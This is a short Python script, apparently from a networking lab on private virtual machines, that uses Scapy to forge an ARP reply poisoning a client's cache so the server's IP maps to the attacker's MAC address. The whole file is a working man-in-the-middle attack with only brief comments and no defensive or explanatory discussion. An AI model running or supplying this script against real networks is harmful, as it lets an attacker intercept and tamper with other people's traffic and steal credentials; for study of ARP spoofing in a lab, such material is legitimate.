#!/usr/bin/python3

from scapy.all import *

#spoof the client VM's mac address to that of our attacker's machine
#the victim is the location of the ARP cache we are poisoning(the client here)
vic_ip = "10.1.1.12"
vic_mac = "08:00:27:02:0a:81"
#the arp entry we are targeting is the server's. We want to map the server's ip to our attacker's mac
ip_target = "10.1.1.11"
spoofed_mac = "08:00:27:f7:32:f8"
#create the ethernet header w/ the spoofed mac
ether = Ether(src = spoofed_mac, dst = vic_mac)
#construct the arp reply message
arp = ARP(psrc = ip_target, hwsrc = spoofed_mac,
	pdst = vic_ip, hwdst = vic_mac)

#set the option as a reply(code 2)
arp.op = 2
#encap the arp message into a new frame
frame = ether/arp
#send the frame
sendp(frame)
